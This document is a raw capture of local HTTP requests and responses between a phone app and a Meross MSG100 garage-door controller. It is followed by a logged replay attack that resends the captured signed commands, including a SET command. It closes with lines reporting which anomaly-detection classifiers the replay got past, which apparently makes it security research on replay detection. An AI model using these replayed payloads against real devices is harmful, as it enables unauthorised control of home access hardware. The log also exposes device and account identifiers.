{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 310
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"029e1e6acf163525f3d8c0f71adc40b8","method":"GET","namespace":"Appliance.System.All","payloadVersion":1,"sign":"e35b20facf33c96e2d9628768a048539","timestamp":1693950616,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"029e1e6acf163525f3d8c0f71adc40b8","namespace":"Appliance.System.All","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950619,"timestampMs":232,"sign":"5ef7ea2ef33a1159b33d3d55eec26c3f"},"payload":{"all":{"system":{"hardware":{"type":"msg100","subType":"us","version":"4.0.0","chipType":"MT7686","uuid":"2210197269145761070248e1e9abec1b","macAddress":"48:e1:e9:ab:ec:1b"},"firmware":{"version":"4.2.6","homekitVersion":"2.0.1","compileTime":"Oct 24 2022 10:28:41","encrypt":1,"wifiMac":"28:e3:47:c2:d9:cc","innerIp":"10.13.0.32","server":"mqtt-us-2.meross.com","port":443,"userId":3094003},"time":{"timestamp":1693950619,"timezone":"Europe/Rome","timeRule":[[1679792400,7200,1],[1698541200,3600,0],[1711846800,7200,1],[1729990800,3600,0],[1743296400,7200,1],[1761440400,3600,0],[1774746000,7200,1],[1792890000,3600,0],[1806195600,7200,1],[1824944400,3600,0],[1837645200,7200,1],[1856394000,3600,0],[1869094800,7200,1],[1887843600,3600,0],[1901149200,7200,1],[1919293200,3600,0],[1932598800,7200,1],[1950742800,3600,0],[1964048400,7200,1],[1982797200,3600,0]]},"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}},"digest":{"togglex":[{"channel":0,"onoff":0,"lmTime":0}],"triggerx":[{"channel":0,"id":"1111111111111111","count":1}],"timerx":[],"garageDoor":[{"channel":0,"open":1,"lmTime":
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"259939626de5e00c3a90c402f16b2945","method":"GET","namespace":"Appliance.System.Online","payloadVersion":1,"sign":"005cccafac06719687a2d754fb8e01fe","timestamp":1693950617,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"259939626de5e00c3a90c402f16b2945","namespace":"Appliance.System.Online","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950619,"timestampMs":393,"sign":"53c1649f281e80ed6fa8fc07f219dfa9"},"payload":{"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}}}

{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"367fa85d94944cf5e3cf7142a6c73dce","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"f93544d6f702eaf30c932275b470d5a3","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"7676369f13689533e0de5e9cdeb093cb","method":"GET","namespace":"Appliance.System.Runtime","payloadVersion":1,"sign":"5c3ef457ca2543e11b9ed80477ffaa8b","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"deb5645000f3625f85e34c3d939d89c4","method":"GET","namespace":"Appliance.Digest.TimerX","payloadVersion":1,"sign":"21d2f77a4e317a621d32366f9e3e7c30","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"7f80c0f99a6766a5c6648de09182cbe9","method":"GET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"c63483a731d40b91cec5b35292097b41","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"8e8bebd8d58f5e2690df8d67e077b896","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"d9c9e5732958958766303b5d29c0a2b0","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"367fa85d94944cf5e3cf7142a6c73dce","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950626,"timestampMs":372,"sign":"1db4236868f8648df5cb8cd17709401a"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"7676369f13689533e0de5e9cdeb093cb","namespace":"Appliance.System.Runtime","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950626,"timestampMs":379,"sign":"b210c72383d26158277a820167c74531"},"payload":{"runtime":{"signal":100}}}

HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"7f80c0f99a6766a5c6648de09182cbe9","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950626,"timestampMs":388,"sign":"c32aba1db63bb0a4a620d6cde24646e3"},"payload":{"DNDMode":{"mode":1}}}

HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"deb5645000f3625f85e34c3d939d89c4","namespace":"Appliance.Digest.TimerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950626,"timestampMs":397,"sign":"b26d688a9d82b6b849b4223ab158b2c2"},"payload":{"digest":[]}}

HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"8e8bebd8d58f5e2690df8d67e077b896","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950626,"timestampMs":402,"sign":"e9127672e71a871d738619a8b8915276"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 315
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"aa10b21b2418b9dfd14f7cb10c5635e7","method":"GET","namespace":"Appliance.Digest.TriggerX","payloadVersion":1,"sign":"a1f40db42ab94fa36fa774852c0093a8","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"aa10b21b2418b9dfd14f7cb10c5635e7","namespace":"Appliance.Digest.TriggerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950626,"timestampMs":538,"sign":"c1847d7a839bed62f63ec7dedf82c392"},"payload":{"digest":[{"channel":0,"id":"1111111111111111","count":1}]}}

POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 334
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"5c550bbd9e9cd29fe84b83a582466f99","method":"SET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"f5a0578b7bc11827793898af684460df","timestamp":1693950629,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{"DNDMode":{"mode":0}}}
HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"5c550bbd9e9cd29fe84b83a582466f99","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"SETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950631,"timestampMs":239,"sign":"e5af2eb1394624655f44c8dc37c1a2c2"},"payload":{}}

START REPLAY ATTACK
#######################################################################################
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 334
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"5c550bbd9e9cd29fe84b83a582466f99","method":"SET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"f5a0578b7bc11827793898af684460df","timestamp":1693950629,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{"DNDMode":{"mode":0}}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"5c550bbd9e9cd29fe84b83a582466f99","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"SETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950736,"timestampMs":854,"sign":"8050d0f5bfdd6e738b70784210654618"},"payload":{}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 315
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"aa10b21b2418b9dfd14f7cb10c5635e7","method":"GET","namespace":"Appliance.Digest.TriggerX","payloadVersion":1,"sign":"a1f40db42ab94fa36fa774852c0093a8","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"aa10b21b2418b9dfd14f7cb10c5635e7","namespace":"Appliance.Digest.TriggerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950736,"timestampMs":865,"sign":"20efe9925aa4ab749dca34c74df1c8ec"},"payload":{"digest":[{"channel":0,"id":"1111111111111111","count":1}]}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"367fa85d94944cf5e3cf7142a6c73dce","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"f93544d6f702eaf30c932275b470d5a3","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"367fa85d94944cf5e3cf7142a6c73dce","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950736,"timestampMs":886,"sign":"819ab6358161bc4f9798e76d804814ff"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"7676369f13689533e0de5e9cdeb093cb","method":"GET","namespace":"Appliance.System.Runtime","payloadVersion":1,"sign":"5c3ef457ca2543e11b9ed80477ffaa8b","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=
****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"deb5645000f3625f85e34c3d939d89c4","method":"GET","namespace":"Appliance.Digest.TimerX","payloadVersion":1,"sign":"21d2f77a4e317a621d32366f9e3e7c30","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=
****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 314
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"7f80c0f99a6766a5c6648de09182cbe9","method":"GET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"c63483a731d40b91cec5b35292097b41","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=
****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 317
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"8e8bebd8d58f5e2690df8d67e077b896","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"d9c9e5732958958766303b5d29c0a2b0","timestamp":1693950624,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=
****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 313
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"259939626de5e00c3a90c402f16b2945","method":"GET","namespace":"Appliance.System.Online","payloadVersion":1,"sign":"005cccafac06719687a2d754fb8e01fe","timestamp":1693950617,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"259939626de5e00c3a90c402f16b2945","namespace":"Appliance.System.Online","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950736,"timestampMs":932,"sign":"2745f28616d143f0cb4869f9ea678beb"},"payload":{"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}}}

****************************************************************
sent payload=POST /config HTTP/1.1
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 310
Host: 10.13.0.32
Accept-Encoding: gzip
User-Agent: okhttp/3.12.0

{"header":{"from":"http://10.13.0.32/config","messageId":"029e1e6acf163525f3d8c0f71adc40b8","method":"GET","namespace":"Appliance.System.All","payloadVersion":1,"sign":"e35b20facf33c96e2d9628768a048539","timestamp":1693950616,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
****************************************************************
received payload=HTTP/1.1 200 OK
Content-Type: application/json

{"header":{"messageId":"029e1e6acf163525f3d8c0f71adc40b8","namespace":"Appliance.System.All","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1693950736,"timestampMs":951,"sign":"5099b1f59ed786f21f5622d5a2179fe9"},"payload":{"all":{"system":{"hardware":{"type":"msg100","subType":"us","version":"4.0.0","chipType":"MT7686","uuid":"2210197269145761070248e1e9abec1b","macAddress":"48:e1:e9:ab:ec:1b"},"firmware":{"version":"4.2.6","homekitVersion":"2.0.1","compileTime":"Oct 24 2022 10:28:41","encrypt":1,"wifiMac":"28:e3:47:c2:d9:cc","innerIp":"10.13.0.32","server":"mqtt-us-2.meross.com","port":443,"userId":3094003},"time":{"timestamp":1693950736,"timezone":"Europe/Rome","timeRule":[[1679792400,7200,1],[1698541200,3600,0],[1711846800,7200,1],[1729990800,3600,0],[1743296400,7200,1],[1761440400,3600,0],[1774746000,7200,1],[1792890000,3600,0],[1806195600,7200,1],[1824944400,3600,0],[1837645200,7200,1],[1856394000,3600,0],[1869094800,7200,1],[1887843600,3600,0],[1901149200,7200,1],[1919293200,3600,0],[1932598800,7200,1],[1950742800,3600,0],[1964048400,7200,1],[1982797200,3600,0]]},"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}},"digest":{"togglex":[{"channel":0,"onoff":0,"lmTime":0}],"triggerx":[{"channel":0,"id":"1111111111111111","count":1}],"timerx":[],"garageDoor":[{"channel":0,"open":1,"lmTime":
****************************************************************
REPLAY ATTACK NOT SUCCESSFUL WITH CLF=OneClassSVM(gamma='auto', nu=0.001)
REPLAY ATTACK SUCCESSFUL WITH CLF=IsolationForest(contamination=0.01)
REPLAY ATTACK SUCCESSFUL WITH CLF=EllipticEnvelope(contamination=0.01)
REPLAY ATTACK SUCCESSFUL WITH CLF=LocalOutlierFactor(contamination=0.01, novelty=True)
REPLAY ATTACK SUCCESSFUL WITH CLF=CustomClassifier()
END REPLAY ATTACK
